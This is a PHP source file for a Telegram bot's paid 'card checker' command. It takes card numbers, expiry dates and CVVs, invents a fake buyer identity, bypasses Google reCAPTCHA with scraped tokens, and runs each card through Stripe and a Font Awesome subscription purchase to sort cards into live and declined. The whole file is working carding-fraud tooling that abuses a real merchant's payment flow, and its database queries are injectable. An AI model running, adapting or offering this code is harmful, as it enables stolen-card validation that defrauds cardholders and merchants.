<?php
if(strpos($message, '!rape') === 0 or strpos($message, '/rape') === 0 or strpos($message, '.rape') === 0){
// reply_to($chatId,$message_id,$keyboard,$maintain);
// exit();
    $keyboard = [
    'inline_keyboard' => [[['text' => 'Features', 'callback_data' => 'paid'], ['text' => 'Buy', 'callback_data' => 'buy'], ['text' => 'Buy Now', 'url' => 'https://t.me/r0ld3x'],]]];
$keyboard = json_encode($keyboard);
checkrole($chatId,$message_id,$keyboard,$nopre,$gId);
$starttime = microtime(true);
$flag = 'getFlags';
$mytime = 'time1';
 
$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
if($role == 'USER'){
    reply_to($chatId,$message_id,$keyboard,$nopre);
    exit();
}elseif(empty($role)){
    reply_to($chatId,$message_id,$keyboard,$noreg);
    exit();
}
sendaction($chatId, typing);
$lista = substr($message, 5);
$lista = clean($lista);
$check = strlen($lista);
$chem = substr($lista, 0,1);
$cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];
$strlenn = strlen($cc);
$strlen1 = strlen($mes);
$ano1 = $ano;
$list = preg_replace('/\s/', '|', $lista);
$vaut = array(1,2,3,7,8,9,0);
if (in_array($chem, $vaut)) { 
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
  } 
if (empty($lista)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif($check<15){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}elseif(strlen($strlenn != 16)){
    reply_to($chatId, $message_id,$keyboard,$validauth);
    exit();
}
if(strlen($strlen1 > 2)) {
$ano = $cvv; 
$cvv = $mes;
$mes = $ano1;}
 
$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT credits FROM persons WHERE userid='$gId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
      $json_array[] = $row;
    }
    $final2 = json_encode($json_array);
    $client = trim(strip_tags(getStr($final2, '"credits":"','"')));
mysqli_close($link);
if($client < 5){ 
    reply_to($chatId, $message_id,$keyboard,$nocredits);
    exit();
}elseif(empty($client)){
    reply_to($chatId, $message_id,$keyboard,$noregister);
    exit();
}
 
$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "SELECT time FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final20 = json_encode($json_array);
    $times = trim(strip_tags(getStr($final20, '"time":"','"')));
mysqli_close($link);
 
$link = mysqli_connect("localhost", "root", "", "demo");    
    $sql = "SELECT role FROM persons WHERE userid='$gId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
      $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"','"')));
mysqli_close($link);
    $current = time();
    $sec = $current - $times;
    if($role == 'MEMBER' and $sec < 30){
    $after = 30 - $sec;
    $antispam = urlencode("<b>[ANTISPAM] <u> TRY AGAIN AFTER $after sec.</u></b>");
    reply_to($chatId,$message_id,$keyboard,$antispam);
    exit();
    }
$sss = reply_to($chatId,$message_id,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> □□□□□ 0%[🟥] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
$respon = json_decode($sss, TRUE);
$message_id_1 = $respon['result']['message_id'];
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
sendaction($chatId, typing);
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=US');
    preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
    $first = $matches1[1][0];
    preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
    $last = $matches1[1][0];
    preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
    $email = $matches1[1][0];
    preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
    $street = $matches1[1][0];
    preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
    $city = $matches1[1][0];
    preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
    $state = $matches1[1][0];
    $state1 = $matches1[1][0];
    preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
    $phone = $matches1[1][0];
    preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
    $zip = $matches1[1][0];
    preg_match_all("(\"username\":\"(.*)\")siU", $get, $matches1);
    $usrnme = $matches1[1][0];
    preg_match_all("(\"password\":\"(.*)\")siU", $get, $matches1);
    $pass = $matches1[1][0];
    preg_match_all("(\"salt\":\"(.*)\")siU", $get, $matches1);
    $salt = $matches1[1][0];
    $pwd = ''.$pass.''.$salt.'';
    preg_match_all("(\"nat\":\"(.*)\")siU", $get, $matches1);
    $con = $matches1[1][0];
    $numero1 = substr($phone, 1,3);
    $numero2 = substr($phone, 6,3);
    $numero3 = substr($phone, 10,4);
    $phone = $numero1.''.$numero2.''.$numero3;
    $serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
    $serv_rnd = $serve_arr[array_rand($serve_arr)];
    $email = str_replace("example.com", $serv_rnd, $email);
    $state = state($state);
$bin = substr($cc,0,6);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$roldex = $fim['bank']['name'];
$bincap2 = $fim['country']['alpha2'];
$bincap4 = $fim['type'];
$bincap3 = $fim['scheme'];
$bincap5 = $fim['brand'];
$che = bannedbin($bin);
if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);
    if(!isset($fim) or $che == true) {
    edit_message($chatId,$message_id_1,$keyboard, "<b>❌BIN BANNED</b>");
    exit();
    }
edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■□□□□ 20%[🟧] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");

curl_close($ch);
sendaction($chatId, typing);
        $anchor_link = 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Lfwy8YZAAAAAOymsOdsZ7xDAG-TFKW_fij1Wnjg&co=aHR0cHM6Ly9mb250YXdlc29tZS5jb206NDQz&hl=en&v=JF4U2g-hvLrBJ_UxdbKj92gN&size=invisible&cb=geddcs3e7k74'; // It looks like: anchor?ar=1&k=
        $anchor_ref  = 'https://fontawesome.com/'; // Open Anchor Headers and see the referer link

    #########################
        // Reload Details

        $reload_link = 'https://www.google.com/recaptcha/api2/reload?k=6Lfwy8YZAAAAAOymsOdsZ7xDAG-TFKW_fij1Wnjg'; // It looks like: reload?k=
        $v   = 'JF4U2g-hvLrBJ_UxdbKj92gN';  // Available in Anchor Query String Parameters
        $k   = '6Lfwy8YZAAAAAOymsOdsZ7xDAG-TFKW_fij1Wnjg';  // Available in Anchor Query String Parameters
        $co  = 'aHR0cHM6Ly9mb250YXdlc29tZS5jb206NDQz';  // Available in Anchor Query String Parameters
        $chr = urlencode('[82,32,81]');  // Available in Reload's Request Payload (Post Field) and looks like: [21,71,92]
        $bg  = 'j4mgicTIAAbIs7pMyLNHthPRyfU5ANI-ACkAIwj8Ri38kV47m1icVjX547M_YLiHzeykoKa7dHYbNd7cFDJqeIgfRwcAAAedVwAAACNtAQecDeDptqnWbE2TKwuiAkIzMFzpanqijagn7Q6mu6TRzeL3qPDbj1Y_Y1784vbfEAZ5Vhi8bqmJcBOFA2iqAlbNVhcqzqw9tAzTUTEwuJYOY-RCG_mpo20HdHaaEHl00YVXUTBFLXDB2K-uVPE-sIyqnK1LJGqeZSv4ypkCbqZ6zqxiNcsT8c94izrNIsSdOLPg5WG6CXi5o4mC7qQAPrayio999VENDQx_C_uFJfG-kxTKw12E-QakYxtDdlzryOn4l9AhZHbUTX9AmDBZT2pjSMRBYKhBrFlV4KmER1Ulm6Bp2twghB3ATMEPykt2qbjhezu-GN9KsSM_Unph2Eea35L4q1KwhF9r14n8XieCV2l2KQYO2RYUYSWHt1a-7ZKjFTxpPDtv5Puik7fC1neknHO6ePJZpe0wPudP7RYNTo5GNCGt_vLOyD4iGCEVUQJ7L9ZQubWE3Pcz6S1JobaWsxvHHmrxQPe8u2xUURWaViaVyye-yaMnII4_XphRoy6X025yc09EClOgPXaM200_Bz_iu5fSECJaCg-oLQdEZ2y1uqxUYBFEIEsqDbgeU55_u6iCKx3xhPixftKaBtMtaEHenoDDGZp732aGJyPO5N1Bq3rl9KcFlWkOdJtWzdA1QiMdtpvXcG7fmPFi2nxGSZnl6MVgogL5fbh2Lqaci8QFSjIh8UV64Yf_yy1YK6QEMr1A77ESGZqNnqkacY_LqbvHa-qCOt3r5AYAFlDSY__JWc0cuUB4Z1En6K9yHrKSmHX9VfPHj-y0mp28A7oXhftnFH-mikCWEVx--0K_b_-mKT5_9Mfa3RtVjhP31XCoevbVWtcZt_6-_jAWQqcyDjdECZ9q2vt6evJGghW7eOP2zgqP0QsYaKLy0hXE1h4Qyz6wBc-iSTaNSIdbOxG-HshqWd7OkH08oUjYwGjtcTaFzhTRkE_nPbyORL7cLGTZHD8hRn5sYPmlP6RZraLtrqVZLSgJwyKUEfa4s1lWO5Z-xu9zyQmEW5CqTTL-MzmDQ-0pKksUAprnBH6-5fcULYlN2Q7A60I5B9dILivEIQGXzKFrQolAwfEKlH5HTUjFyWu8zkKd5r_d__oyj73yWJLx9fygLO_VvYKUnQBQXCFHImwSTzrWWCBYzgT1NPPuB56GjB0ce7LYbWpgZJAD6hjOtIwLv1zSV4EVYicFeexhcpEgyoSjAw1aChwQ7bsWMKLqshrVmJIyWh5-DS3dAmdf2gxUKpECr38C3x8sL6tmq7GQnkiJ11WNnZ8hQR933_nxIqkTNdtseAOabC-erhbe5DJwlOcUg_xdr815TN8zJ3m-Eq48pkThn_C6zuyvyF-eoj0vYQFrvWO7gdVZuxQ6Mx3JZx0STjVDwP4l36iV3EnHYU03MgGBQZHR-x_yLySPSaPap73bIpNBKgJrAo4c0RTHasYTEB5QPjsp_lfVu03AbCtKDQpDbd8qgsYZTQuj0iqnnIK_t7rnJXm7wPFB_8y90T0cz1eK58r9V2n6TME0XfBlYd-Ok2muXr6x6xNCOIHK48MckYqEhqoSqvMI24D-kpjhA9pMc57E4YtFXT2vyIJlGaOf1bFlclJA71e98Y1viAtInR25eIhE9jyDgk4n35VFAY60SZn3y_JGrebnrnOEFX9ITIPVX6Roqkuedob5HFHtdoVX5uKefGspsyichOZBJ1CrV7dfLT3ZovFdRAmneT6O4qCT_o3bXiRNMWf64ZP1u7zrLG7Gyw1YRY4R2RIZFqha-2X8O5LZz7LO5h5PFPwXL0X2VRfXeW_jrj0FI-DeqWSqlnpLOJhPLNixGjqzN8gzN_hZpQaRAiFabcZ4gP3tF-BoQek4U-rtIJBjP3Gyac_awBI0iDmDi4xpEreB3JbjLZFNNMSJRVTvcEggPbno6OW5LP_dEOQJ6Wy_2D0wWv9Djxk1vuGA2aTrUWFZxLKHZuM15RTydP8rb51KuBXuNsJ1YBSscnB8tPGc19kO7vnzmXRMIzG5Koe32_80f4Ksece5pViqGpmeRgi7rHnQc_XJEKxA_IEh5R-noidPuIGrWq5ZtcERZGlkZkVT4Ha0oh3UxvdCJwSvNi0XNo2ku71n5KVOKbwGtsgaUxEAjzxxXHjpyRY7e7QxSTqmPh8-5KtvXxkQjHJdWZjrdYc09wlnoSRt6-JbXplf83FMVVSFszskeQfkyD3wfgwUMYYakiknu6h1jR38eLJVQ8kaziGgPbdwxcvwwqqVTSOy0a9ydMZKCqXYHZAwj0dJwrsejxR-TovHQLsO_aUO2i4JX3x7agF8SvX7TMcIMYqTrAi9x_fzJHwjiyKH3sYw_1QMrXb5aSkDSGg7teZJm44oeGqrbagiu-xFOyIzOiBfLVMi3dzil4hduUJVP-ce993EplGwcWKYmoGRQA6O0oNhzNmMMZJXcDvHdUFbpRlat3M7tm12j8zLIfibXY0k08JXaK0Y-zaoYlV5af_xaWETVFIbPbpBOXVVH1vD7FTUFAszNk7tbefiYl_DX8CrJPAlBZPbIf7493l3lSUB0Z_waKXoZWqE_4md861wqqNWFCkOwApvlOilT3pGI9rnMLBatOsT_BuwxOVWg5ggJ3J0CirLZfuqJ6sI3rDtQaJUEGmqs-qB741rh7KRryaKA1gEklqbMDIvXUPDxCfm-ShajGK5xwTVZUuFHtZblTxX6TF_Ob37uEqRblAo3mB1T7DUG_XD7cdt3hOct0JhW2X-lcRdnEomhEzz3YzvPtQirvJZeORu-m8fU70TwUFJDopaFVNGNWshNb3KDkqLF6IB9kk533JzkjrtyrXFuWYxTjJncV298-5V8DoxKhT88bULqBxkSwupKJveX7tka9uGDqbfJIj7dzOI_Z8veBaE_0vIt5dn0eTXLFVOKrEkuKKeujawiUim37f7L1ZRHdfIo9Xtpb2vJJ4f6ttaT0ch8Hravjg6K5jYWMkK2Keym2u7Wngk_jmne0lAiID0QJAGtZdSskcKZ_mC831obpux_scBZdO2RaGUWx0a0VUbPJwA2o2zoGGuuaYkEWLCSqmEbE3lwo69n8Yd4nW2QiqjfK8q-ArHkJtF4A28r4rKyjAgyGQMxuj7CBLfcgLaT2PBoqgKvjH4A93ki8LwjvPRCZMeBgEY7c2GnxJLL0FJ9uGN_607nyp8T425FtKCn1P4dYae3XQdZZx5gAaS9YV1ouNz4y8KqkkcrhoinUTnu0DEyfpHtfgsxjKX-Lztne5-SwHsixkKqb2DFuULMkAwOhmH7bbu8pBsfIq8s4bq-j2xu8nMWS9HuHJ4rOv4YiZFEyOij9b6WSR9Wh343NuHtR_bET7uDjo8PB5T4wv2uRUfzD7ekXh1sT_Ta7RibS34R8dc1zAbFdA4CJUMtYVS29lMv3-9D4hJGNdkPnJvAABdht696PqYduirbICp8s5uoYCaFWPbY74IsiG3NVe4aWeFSBw9tSb_LCyvHlvtQ-GsaSCJudPC959RwHkDVDTrtznauQpps3KEXltzzhvMCBSWqEzHLxg7WCPIuZ2_urFRDk8DkjM8KcsoGkBn7RusK3jjjjwoUpNQEqCEwZGgmULgeqde9rsRdWt0PyI8XZNBmdZ8ZzDab2KV7t31mdNUt-KMX-YV7asMm2-Am3QxDT4xAP01LlJdWPaDqPK-Geav0DNd1VY2NXLpB0M17cMGAHvCbhp7tjltpiY32aYkGHkj6wdYgfbERM8WdbUlutOazaubKQrSZM7AqIT4mWWUP1b99q8c8m2sQaInF9G-zzyqz6HbGvCQboIgXin6wruTyDV8J7YciRZJTRzV_yKO1EhGREJNDWE12UR6zM7GXzKSqht5Elkh3oGTi-HMhLfKjeWQcGoykXflmZfr5lpzY28cfCwgEWQbatmefdX9HqDhsuQ_miVvBL4eQSbu8r2MzEKoqIq9huR7KO3lVMDfeUmxWVsQ7lhBlv5lU2O_KjnuGerhz9cu1jDii1Pg8i9i0UveK3URRYkeHQJ9Q6xzpKZwVDk5YSoiTKD3l5WjR-C6ASXSDUasopMxv3E_UbK8xS2wyhJCgQan-OHXS2pRiGyftlVbx_gmQoF_3K51bG6Qr0iIFoVdxKU5VQEOMTivwuv_lcgHm1MaSGKDUjieizD7gzegO_3L2jQKxwg3NcdxN7npSdQ6qWS3sKAoxs-_qjPcdZhNKci6QlRJsqvF23VuVNSxKM5fs0GurSPjBSp0xlygsGVmEnOv_pCrEohTOzxgbcykHsGwXbXiPq76QVLzQiE2sVC1_twN06P1-nwduNN-gv88cTXVZfQ__WqyAGiK3uSZR01PW4kJT_qOK_quXcAZc3v6I1LkMC0u1LAfhdxeVrMl57IbQtvLqtvdWFtCBGsnHG7tB2sNCVqJ-vMQ5ICCpcgWi-LYOKqgnUDQ7HgJIHpJtJOJ9J25sifcN3PhuitnqgOhauYTodU4I6wE5kG5yE5twastrw0V0Db-CSo2wR_WNA7twe0Q7JOX5Z2HYLzdb6bbqx8OqDYcHpfIX-DNmd2LIPeBpiQoxks3nOr8DHVaqFqyZldtvkfS5vDQxEQIhCwRZT6Ei9Z_yXdWm2QnxESsNOE7rDppigZg-kasJno_jCnuOpeKP1AL2yOl4el0GJvFHNi7yyihstZoZWgY1e2trbysY6D8DlI000sMTZQCAFYYvX-jlxYgfD5IydU2Dak3X4iBs7g-7p62pt-UvMk';  // Available in Reload's Request Payload and is after the $chr and it starts from ! and ends with * (Exclude *)
        $vh  = '16019502132';  // Available in Reload's Request Payload and is after the $bg and select only the number (Sometimes - sign is also included in number, you have to take that - sign also)

    ###############[Google V3 Captcha - 1 REQ]#################

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $anchor_link);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'authority: www.google.com',
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language: en-US,en;q=0.9',
        'referer: '.$anchor_ref.'',
        'sec-fetch-dest: iframe',
        'sec-fetch-mode: navigate',
        'sec-fetch-site: cross-site',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $G_v3 = curl_exec($ch);
        curl_close($ch);


        $rtk = Capture($G_v3, '<input type="hidden" id="recaptcha-token" value="', '"');

    ###############[Google V3 Captcha - 2 REQ]#################

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $reload_link);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'authority: www.google.com',
        'accept: */*',
        'accept-language: en-US,en;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://www.google.com',
        'referer: '.$anchor_link.'',
        'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'v='.$v.'&reason=q&c='.$rtk.'&k='.$k.'&co='.$co.'&hl=en&size=invisible&chr='.$chr.'&vh='.$vh.'&bg='.$bg.'');
        $G_v3 = curl_exec($ch);
        curl_close($ch);

        if (!strpos($G_v3, '"rresp","')){
sendMessage1($G_v3);
edit_message($chatid,$message_id_1,$keyboard,"CAPTCHA NOT FOUND \n <i>TRY AGAIN</i>");
        }


        $captcha = Capture($G_v3, '["rresp","', '"',); /// Your V3 CAPTCHA KEY WILL COME HERE
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://fontawesome.com/plans/standard');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: fontawesome.com',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: en-IN,en-US;q=0.9,en;q=0.8',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

# ----------------- [1req Postfields] ---------------------#

$result1 = curl_exec($ch);
$cook = trim(strip_tags(getStr($result1,'fontawesome=',';')));
# -------------------- [1 REQ] -------------------#
# -------------------- [2 REQ] -------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'scheme: https',
'accept: application/json',
'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$zip.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fd9d990825%3B+stripe-js-v3%2Fd9d990825&time_on_page=64768&key=pk_live_AvhFggtb64bh0uTt6ChgEsA8');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://fontawesome.com/api/new-subscription');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: fontawesome.com',
'method: POST',
'scheme: https',
'accept: application/vnd.api+json',
'accept-language: en-US,en;q=0.9',
'content-type: application/vnd.api+json',
'cookie: fontawesome='.$cook.'',
'origin: https://fontawesome.com',
'referer: https://fontawesome.com/plans/standard',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'{"meta":{"processor":"stripe","processor-token":"'.$id.'","recaptcha-token":"'.$captcha.'","payment-method":"card"},"data":{"type":"subscription","attributes":{"sku":"FA-STANDARD","seats":5,"email":"'.$email.'","password":"'.$pwd.'"}}}');

$result2 = curl_exec($ch);
$res = getStr($result2, '"detail":"','"');
    curl_close($ch);

edit_message($chatId,$message_id_1,$keyboard,"<b> CC ->> <code>$cc|$mes|$ano|$cvv</code> %0APROCESS ->> ■■■■■ 100%[🟩] %0ATIME ->> {$mytime($starttime)}s %0ACHECKING BY ->> <a href='tg://user?id=$gId'>@$username</a> %0ABOT BY :- <a href='tg://user?id=1317173146'>@r0ld3x</a></b>");
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
 if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, 'The zip code you supplied failed validation.'))){
  $status = "<b>CARD LIVE ✅</b>";
  $cc_code = "<b>INCORRECT ZIP</b>";
}
elseif ((strpos($result2, 'unable to authenticate')) || (strpos($result2, "Customer authentication is required")) || (strpos($result2, 'requiresAction":true')) || (strpos($result2, "three_d_secure_redirect"))){
  $status = "<b>CARD LIVE ✅</b>";
  $cc_code = "<b>3d Security</b>";
}
elseif ((strpos($result2, '"cvc_check":"pass"')) || (strpos($result2, "Thank You.")) || (strpos($result2, '"status": "succeeded"')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "Your payment has already been processed")) || (strpos($result2, "SUCCESS")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){
  $status = "<b>CARD LIVE ✅</b>";
  $cc_code = "<b>PAYMENT DONE</b>";
}
elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
  $status = "<b>CARD LIVE ✅</b>";
  $cc_code = "<b>INSUFFICIENT FUNDS</b>";
}
elseif ((strpos($result2, "Your card's security code is incorrect.")) || (strpos($result2, "incorrect_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
  $status = "<b>CCN LIVE ✅</b>";
  $cc_code = "<b>INCORRECT CVV</b>";
}
elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
  $status = "<b>CARD DECLINED ❌</b>";
  $cc_code = "<b>DOESN'T SUPPORT THIS TYPE OF PURCHASE</b>";
}
elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "lost_card")) || (strpos($result2, "stolen_card"))){
  $status = "<b>CARD DECLINED ❌</b>";
  $cc_code = "<b>LOST CARD</b>";
}
elseif ((strpos($result2, "fraudulent")) || (strpos($result2, "lost_card")) || (strpos($result2, "fraudulent card"))){
  $status = "<b>CARD DECLINED❌</b>";
  $cc_code = "<b>FRAUDULENT CARD</b>";
}
elseif (strpos($result2, "do_not_honor")){
  $status = "<b>CARD DECLINED❌</b>";
  $cc_code = "<b>DO NOT HONOR</b>";
}
elseif ((strpos($result2, 'Your card has expired.')) || (strpos($result1, 'expired_card'))){
  $status = "<b>CARD EXPIRED ❌</b>";
  $cc_code = "<b>EXPIRED CARD</b>";
}
elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'Call to a member function')) || (strpos($result2, 'incorrect_number'))){
  $status = "<b>INVALID CARD ❌</b>";
  $cc_code = "<b>INCORRECT NUMBER</b>";
}
elseif ((strpos($result1, 'The card number is incorrect.')) || (strpos($result2, 'incorrect-number')) || (strpos($result2, 'incorrect_number'))){
  $status = "<b>INVALID CARD ❌</b>";
  $cc_code = "<b>INCORRECT NUMBER</b>";
}
elseif (strpos($result2, "generic_decline")){
  $status = "<b>CARD DECLINED❌</b>";
  $cc_code = "<b>GENERIC DECLINE</b>";
}
elseif ((strpos($result2, '"cvc_check":"unavailable"')) || (strpos($result2, '"cvc_check": "unchecked"')) || (strpos($result2, '"cvc_check": "fail"'))){
  $status = "<b>CARD DECLINED❌️</b>";
  $cc_code = "<b>SECURITY CHECK : '.$cvc_check.'</b>";
}
elseif ((strpos($result2, "Your card was declined.")) || (strpos($result2, 'The card was declined.'))){
  $status = "<b>CARD DECLINED❌</b>";
  $cc_code = "<b>CARD DECLINED</b>";
}
elseif(!$result2){
  $status = "<b>CHECKER DEAD</b>";
  $cc_code = "DO AGAIN";
}else{
  $status = "<b>CHECKER DEAD</b>";
  $cc_code = "'CHECK AGAIN";
}
if(!empty($ccc)){
    $status = $ccc;
}if(!empty($res)){
    $cc_code = $res;
}
if(!isset($result2)){
// sendMessage1($result);
$result = urlencode("<b>
GATE --> <i>STRIPE - CHARGE 99USD</i>
CC ->> <code>$cc|$mes|$ano|$cvv|@RoldexVerse</code>
Result ->> Unknown error
Message ->> Check again
Bin Info ->> $bincap4-$bincap3-$bincap5
Bank Info ->> $roldex-$bincap2-{$flag($bincap2)}
Time ->> {$mytime($starttime)}s
Checked By ->> <a href='tg://user?id=$gId'>@${username}</a>[<i>$role</i>]
Bot By --> <code>@r0ld3x</code></b>");
sendMessage1($list);
edit_message($chatId,$message_id_1,$keyboard, $result);
    $timest = time();

$link = mysqli_connect("localhost", "root", "", "demo");
    $sql = "UPDATE persons SET time = '$timest' WHERE persons.userid='$gId'";
    $result21 = mysqli_query($link, $sql);
mysqli_close($link);
exit();
}


